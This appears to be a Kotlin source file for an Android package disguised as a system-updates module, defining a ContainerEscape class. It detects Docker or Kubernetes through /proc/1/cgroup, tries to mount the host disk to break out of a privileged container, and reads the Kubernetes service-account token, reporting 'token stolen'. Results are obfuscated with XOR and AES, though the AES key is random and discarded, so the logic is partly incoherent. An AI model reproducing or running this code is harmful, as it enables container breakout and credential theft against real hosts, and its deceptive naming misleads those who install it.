package com.system.updates.modules

import android.content.Context
import android.util.Base64
import java.io.BufferedReader
import java.io.InputStreamReader
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class ContainerEscape {
    private val r = SecureRandom()
    private val key = byteArrayOf(0x2D, 0x3E, 0x4F, 0x5A, 0x6B, 0x7C, 0x8D.toByte(), 0x9E.toByte())

    private fun xor(data: ByteArray): ByteArray {
        return data.mapIndexed { i, b -> (b.toInt() xor key[i % key.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(ByteArray(32).also { r.nextBytes(it) }, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    fun detectContainer(): String {
        return try {
            val proc = Runtime.getRuntime().exec("cat /proc/1/cgroup")
            val reader = BufferedReader(InputStreamReader(proc.inputStream))
            val output = reader.readText()
            reader.close()
            when {
                output.contains("docker") -> "docker"
                output.contains("kubepods") -> "kubernetes"
                output.contains("lxc") -> "lxc"
                else -> "none"
            }
        } catch (e: Exception) {
            "unknown"
        }
    }

    fun escapeAttempt(): String {
        val containerType = detectContainer()
        return when (containerType) {
            "docker" -> attemptDockerEscape()
            "kubernetes" -> attemptK8sEscape()
            else -> "not applicable"
        }
    }

    private fun attemptDockerEscape(): String {
        return try {
            // try to mount host filesystem (requires privileged mode)
            Runtime.getRuntime().exec("mkdir -p /tmp/host")
            Runtime.getRuntime().exec("mount /dev/sda1 /tmp/host")
            "escape attempted"
        } catch (e: Exception) {
            "escape failed"
        }
    }

    private fun attemptK8sEscape(): String {
        return try {
            // try to access service account token
            val proc = Runtime.getRuntime().exec("cat /var/run/secrets/kubernetes.io/serviceaccount/token")
            val reader = BufferedReader(InputStreamReader(proc.inputStream))
            val token = reader.readText()
            reader.close()
            if (token.isNotEmpty()) "token stolen" else "no token"
        } catch (e: Exception) {
            "escape failed"
        }
    }

    fun encryptResult(result: String): String {
        val raw = result.toByteArray()
        val x = xor(raw)
        val enc = aesEnc(x)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }
}